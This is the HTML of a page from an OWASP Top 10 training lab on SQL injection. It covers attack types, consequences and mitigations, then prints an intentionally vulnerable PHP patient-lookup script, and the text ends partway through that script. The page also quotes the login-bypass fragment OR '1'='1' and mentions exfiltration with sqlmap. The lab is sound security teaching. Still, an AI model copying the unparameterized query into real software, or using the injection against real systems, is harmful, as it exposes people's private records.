@@ -1,0 +1,472 @@
+<!doctype html>
+<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-injection/sql-injection" data-has-hydrated="false">
+<head>
+<meta charset="UTF-8">
+<meta name="generator" content="Docusaurus v3.9.1">
+<title data-rh="true">SQL Injection | OWASP TOP 10 Labs</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://mehdiaitsaid.github.io/owasp-top-10-labs/img/logo.png"><meta data-rh="true" name="twitter:image" content="https://mehdiaitsaid.github.io/owasp-top-10-labs/img/logo.png"><meta data-rh="true" property="og:url" content="https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/sql-injection"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="SQL Injection | OWASP TOP 10 Labs"><meta data-rh="true" name="description" content="Overview"><meta data-rh="true" property="og:description" content="Overview"><link data-rh="true" rel="icon" href="/owasp-top-10-labs/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/sql-injection"><link data-rh="true" rel="alternate" href="https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/sql-injection" hreflang="en"><link data-rh="true" rel="alternate" href="https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/sql-injection" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"SQL Injection","item":"https://mehdiaitsaid.github.io/owasp-top-10-labs/labs/injection/sql-injection"}]}</script><link rel="stylesheet" href="/owasp-top-10-labs/assets/css/styles.a48fac3f.css">
+<script src="/owasp-top-10-labs/assets/js/runtime~main.bd5e239f.js" defer="defer"></script>
+<script src="/owasp-top-10-labs/assets/js/main.ffb82710.js" defer="defer"></script>
+</head>
+<body class="navigation-with-keyboard">
+<svg style="display: none;"><defs>
+<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
+</defs></svg>
+<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/owasp-top-10-labs/img/logo.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/owasp-top-10-labs/"><div class="navbar__logo"><img src="/owasp-top-10-labs/img/logo.png" alt="OWASP TOP 10 Labs" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/owasp-top-10-labs/img/logo.png" alt="OWASP TOP 10 Labs" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">OWASP</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/owasp-top-10-labs/labs/intro">Labs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/mehdiaitsaid/owasp-top-10-labs.git" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/intro"><span title="Introduction" class="linkLabel_WmDU">Introduction</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/setup"><span title="Setup" class="linkLabel_WmDU">Setup</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/broken-access-control"><span title="Broken Access Control" class="linkLabel_WmDU">Broken Access Control</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/cryptographic-failures"><span title="Cryptographic Failures" class="linkLabel_WmDU">Cryptographic Failures</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/owasp-top-10-labs/labs/injection/sql-injection"><span title="Injection" class="categoryLinkLabel_W154">Injection</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/owasp-top-10-labs/labs/injection/sql-injection"><span title="SQL Injection" class="linkLabel_WmDU">SQL Injection</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/owasp-top-10-labs/labs/injection/xss"><span title="XSS" class="linkLabel_WmDU">XSS</span></a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/insecure-design"><span title="Insecure Design" class="linkLabel_WmDU">Insecure Design</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/security-misconfiguration"><span title="Security Misconfiguration" class="linkLabel_WmDU">Security Misconfiguration</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/vulnerable-outdated-components"><span title="Vulnerable and Outdated Components" class="linkLabel_WmDU">Vulnerable and Outdated Components</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/identification-authentication-failures"><span title="Identification and Authentication Failures" class="linkLabel_WmDU">Identification and Authentication Failures</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/software-data-integrity-failures"><span title="Software and Data Integrity Failures" class="linkLabel_WmDU">Software and Data Integrity Failures</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/logging-monitoring-failures"><span title="Security Logging and Monitoring Failures" class="linkLabel_WmDU">Security Logging and Monitoring Failures</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/owasp-top-10-labs/labs/ssrf"><span title="Server-Side Request Forgery (SSRF)" class="linkLabel_WmDU">Server-Side Request Forgery (SSRF)</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/owasp-top-10-labs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Injection</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">SQL Injection</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>SQL Injection</h1></header>
+<p><strong>Overview</strong><br>
+<!-- -->SQL Injection (SQLi) is one of the oldest and most dangerous web application vulnerabilities. It occurs when an application includes untrusted input in an SQL query without proper validation or parameterization, allowing an attacker to alter the intended SQL command. In a lab context we use controlled vulnerable examples to learn how SQLi works, its impact, and how to prevent it.</p>
+<blockquote>
+<p>⚠️ <strong>Important:</strong> This lab is for educational, legal, and controlled environments only. Do <strong>not</strong> apply these techniques against systems you do not own or do not have explicit permission to test.</p>
+</blockquote>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-sql-injection">What is SQL Injection?<a href="#what-is-sql-injection" class="hash-link" aria-label="Direct link to What is SQL Injection?" title="Direct link to What is SQL Injection?" translate="no">​</a></h2>
+<p>SQL Injection happens when user-supplied data is treated as part of an SQL statement. Instead of being handled as data, attacker input changes the structure of the SQL query that the database executes. Depending on the vulnerability and the database privileges, an attacker may be able to:</p>
+<ul>
+<li>Read sensitive data (exfiltrate)</li>
+<li>Bypass authentication</li>
+<li>Modify or delete data</li>
+<li>Execute administrative operations</li>
+<li>Pivot to other systems or escalate privileges</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="common-sqli-types">Common SQLi Types<a href="#common-sqli-types" class="hash-link" aria-label="Direct link to Common SQLi Types" title="Direct link to Common SQLi Types" translate="no">​</a></h2>
+<ul>
+<li><strong>In-band (Classic)</strong>
+<ul>
+<li><em>Union-based:</em> use <code>UNION SELECT</code> to append attacker-controlled result sets to the application’s results.</li>
+<li><em>Error-based:</em> provoke database errors that leak information (column names, data types, query structure).</li>
+</ul>
+</li>
+<li><strong>Blind SQLi</strong>
+<ul>
+<li><em>Boolean-based:</em> infer data by observing true/false responses from the application.</li>
+<li><em>Time-based:</em> infer data by causing the database to delay responses conditionally (e.g., <code>SLEEP()</code>).</li>
+</ul>
+</li>
+<li><strong>Out-of-band (OOB)</strong>
+<ul>
+<li>Use database features that make the DB server connect out to an attacker-controlled service (useful when direct responses are limited).</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="typical-consequences">Typical Consequences<a href="#typical-consequences" class="hash-link" aria-label="Direct link to Typical Consequences" title="Direct link to Typical Consequences" translate="no">​</a></h2>
+<ul>
+<li><strong>Data disclosure / exfiltration:</strong> Steal sensitive records (PHI, financial records, credentials).</li>
+<li><strong>Authentication bypass:</strong> Log in as other users without knowing their password.</li>
+<li><strong>Data tampering:</strong> Modify or delete records (medical data, billing).</li>
+<li><strong>Privilege escalation:</strong> Execute admin-level commands or access restricted features.</li>
+<li><strong>Denial of Service (DoS):</strong> Run expensive or blocking queries that exhaust DB resources.</li>
+<li><strong>Reconnaissance &amp; pivoting:</strong> Discover schema, tables, and columns to plan further attacks or lateral movement.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="realistic-use-cases-relevant-to-this-lab">Realistic Use Cases (relevant to this lab)<a href="#realistic-use-cases-relevant-to-this-lab" class="hash-link" aria-label="Direct link to Realistic Use Cases (relevant to this lab)" title="Direct link to Realistic Use Cases (relevant to this lab)" translate="no">​</a></h2>
+<ol>
+<li>
+<p><strong>Data disclosure / exfiltration (PHI &amp; billing)</strong></p>
+<ul>
+<li>Attacker extracts patient records and billing details from <code>patients</code> and <code>billing</code> tables. Consequences include privacy breach, regulatory fines (HIPAA / GDPR), and reputational damage.</li>
+</ul>
+</li>
+<li>
+<p><strong>Authentication bypass</strong></p>
+<ul>
+<li>Manipulate login queries to bypass credential checks (e.g., <code>OR &#x27;1&#x27;=&#x27;1&#x27;</code>) and assume other users’ identities.</li>
+</ul>
+</li>
+<li>
+<p><strong>Data modification / sabotage</strong></p>
+<ul>
+<li>Change or delete clinical notes, lab results, or billing records to disrupt care or cover tracks.</li>
+</ul>
+</li>
+<li>
+<p><strong>Reconnaissance for further exploitation</strong></p>
+<ul>
+<li>Enumerate table and column names, data types, and relationships to plan targeted exfiltration or escalation.</li>
+</ul>
+</li>
+<li>
+<p><strong>Out-of-band exfiltration</strong></p>
+<ul>
+<li>When direct query responses are filtered, use OOB channels (e.g., DNS or HTTP callbacks) to leak data.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="lab-scope--structure">Lab scope &amp; structure<a href="#lab-scope--structure" class="hash-link" aria-label="Direct link to Lab scope &amp; structure" title="Direct link to Lab scope &amp; structure" translate="no">​</a></h2>
+<p>This lab is organized in <strong>three parts</strong> so students can learn step-by-step:</p>
+<ol>
+<li>
+<p><strong>Vulnerable code</strong></p>
+<ul>
+<li>Inspect an intentionally vulnerable PHP page that constructs SQL queries by concatenating user input. You will see how input maps to SQL and how easy it is to manipulate.</li>
+</ul>
+</li>
+<li>
+<p><strong>Secure solution</strong></p>
+<ul>
+<li>Replace the vulnerable code with a safe implementation using parameterized queries (prepared statements), input handling, least-privilege DB accounts, and safer error handling.</li>
+</ul>
+</li>
+<li>
+<p><strong>Introduction to sqlmap</strong></p>
+<ul>
+<li>Learn how to use <code>sqlmap</code> (an automated SQLi tool) responsibly to detect and demonstrate SQLi vectors in a controlled lab. We will use <code>sqlmap</code> to enumerate tables, extract sample rows, and compare what <code>sqlmap</code> can automate vs. manual exploitation techniques.</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p><strong>Note:</strong> The database schema and initial sample data used by this lab are described on the <strong>Setup</strong> page. Please make sure the environment is deployed exactly as shown on the Setup page before performing any exploitation steps.</p>
+</blockquote>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="detection--mitigation-high-level">Detection &amp; Mitigation (high-level)<a href="#detection--mitigation-high-level" class="hash-link" aria-label="Direct link to Detection &amp; Mitigation (high-level)" title="Direct link to Detection &amp; Mitigation (high-level)" translate="no">​</a></h2>
+<p><strong>Detection indicators</strong></p>
+<ul>
+<li>Unusual or large SELECT queries from a single account or IP</li>
+<li>Repeated malformed queries or database errors in logs</li>
+<li>Rapid increases in exported/returned rows or bandwidth</li>
+<li>WAF/DB monitoring alerts for suspicious patterns (e.g., <code>%UNION%</code>, <code>SLEEP</code>, repeated quotes)</li>
+</ul>
+<p><strong>Mitigation checklist</strong></p>
+<ul>
+<li>Use parameterized queries / prepared statements everywhere</li>
+<li>Validate and whitelist input where possible (deny-by-default)</li>
+<li>Use least-privilege database accounts (limit SELECT columns)</li>
+<li>Disable verbose DB error output to clients; log safely and redact PHI</li>
+<li>Implement DB activity monitoring and anomaly detection</li>
+<li>Apply a WAF as an additional layer (but don’t rely on it as sole protection)</li>
+</ul>
+<hr>
+<h1>Vulnerable Code — Patient Lookup (Insecure)</h1>
+<hr>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-vulnerable-php-page-file-patient_lookupphp">1) Vulnerable PHP page (file: <code>patient_lookup.php</code>)<a href="#1-vulnerable-php-page-file-patient_lookupphp" class="hash-link" aria-label="Direct link to 1-vulnerable-php-page-file-patient_lookupphp" title="Direct link to 1-vulnerable-php-page-file-patient_lookupphp" translate="no">​</a></h2>
+<p>Save the following file in your web root (e.g., <code>/src/patient_lookup.php</code>):</p>
+<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// patient_lookup.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// Vulnerable demo for educational SQL Injection lab (Data disclosure)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// DB connection config - adjust to your environment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_HOST = &#x27;hostname&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_USER = &#x27;username&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_PASS = &#x27;password&#x27;;         // set your password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_NAME = &#x27;dbname&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DB_PORT = 3306;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// Connect (mysqli, procedural)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (!$conn) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(&quot;DB connection error.&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// Get query parameter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$q = isset($_GET[&#x27;q&#x27;]) ? $_GET[&#x27;q&#x27;] : &#x27;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// --- Vulnerable SQL (UNSAFE) ---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$sql = &quot;SELECT id, medical_record_number, first_name, last_name, dob, email FROM patients WHERE first_name LIKE &#x27;%$q%&#x27; OR last_name LIKE &#x27;%$q%&#x27; LIMIT 100;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// Execute and show results</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$result = mysqli_query($conn, $sql);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;!doctype html&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;html&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;head&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;title&gt;Patient Lookup (Vulnerable)&lt;/title&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;style&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    body { font-family: Arial, sans-serif; padding: 20px; background:#f7f7f9; color:#222; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .card { background: white; border-radius:8px; padding:16px; box-shadow:0 2px 6px rgba(0,0,0,.08); max-width:900px; margin:auto; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    table { width:100%; border-collapse: collapse; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    th,td { padding:8px; border-bottom:1px solid #eee; text-align:left; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    input[type=&quot;text&quot;]{ padding:8px; width:60%; margin-right:8px; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    button{ padding:8px 12px; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .danger{ color:#8b0000; font-weight:bold; }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;/style&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/head&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;body&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &lt;div class=&quot;card&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;h2&gt;Patient Lookup (VULNERABLE)&lt;/h2&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;p class=&quot;danger&quot;&gt;This page is intentionally vulnerable — for lab use only.&lt;/p&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;form method=&quot;get&quot; action=&quot;/patient_lookup.php&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &lt;input type=&quot;text&quot; name=&quot;q&quot; placeholder=&quot;Enter patient first/last name (e.g. John)&quot; value=&quot;&lt;?php echo htmlspecialchars($q); ?&gt;&quot; /&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &lt;button type=&quot;submit&quot;&gt;Search&lt;/button&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;/form&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;hr/&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;h3&gt;Results&lt;/h3&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;?php if ($result === false): ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &lt;div style=&quot;color: red;&quot;&gt;Query error: &lt;?php echo htmlspecialchars(mysqli_error($conn)); ?&gt;&lt;/div&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;?php else: ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &lt;table&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;thead&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          &lt;tr&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &lt;th&gt;#&lt;/th&gt;&lt;th&gt;MRN&lt;/th&gt;&lt;th&gt;First Name&lt;/th&gt;&lt;th&gt;Last Name&lt;/th&gt;&lt;th&gt;DOB&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          &lt;/tr&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;/thead&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;tbody&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          &lt;?php while ($row = mysqli_fetch_assoc($result)): ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &lt;tr&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;id&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;medical_record_number&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;first_name&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;last_name&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;dob&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              &lt;td&gt;&lt;?php echo htmlspecialchars($row[&#x27;email&#x27;]); ?&gt;&lt;/td&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &lt;/tr&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          &lt;?php endwhile; ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;/tbody&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &lt;/table&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;?php endif; ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;p style=&quot;margin-top:16px; font-size:0.9em; color:#555;&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Note: the SQL query shown on the server is: 